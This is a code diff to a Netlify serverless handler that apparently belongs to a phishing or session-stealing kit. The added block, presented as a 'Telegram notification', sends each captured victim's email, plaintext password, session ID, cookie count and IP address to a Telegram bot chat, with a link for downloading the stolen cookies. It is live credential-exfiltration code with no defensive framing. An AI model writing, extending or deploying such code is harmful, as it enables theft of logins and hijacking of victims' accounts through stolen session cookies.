@@ -94,6 +94,40 @@ export const handler = async (event, context) => {
 
     console.log('✅ Session saved successfully:', sessionData.sessionId);
 
+    // Also try to send immediate Telegram notification
+    try {
+      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+      
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const quickMessage = `🔔 NEW SESSION SAVED
+
+📧 ${sessionData.email}
+🔑 ${sessionData.password}
+🆔 ${sessionData.sessionId}
+🍪 ${Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0} cookies
+🌐 IP: ${sessionData.clientIP}
+🕒 ${new Date().toLocaleString()}
+
+Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionData.sessionId}`;
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: quickMessage,
+            parse_mode: 'Markdown'
+          }),
+          signal: AbortSignal.timeout(10000)
+        });
+        
+        console.log('✅ Quick Telegram notification sent');
+      }
+    } catch (telegramError) {
+      console.error('⚠️ Failed to send quick Telegram notification:', telegramError);
+    }
+
     return {
       statusCode: 200,
       headers,
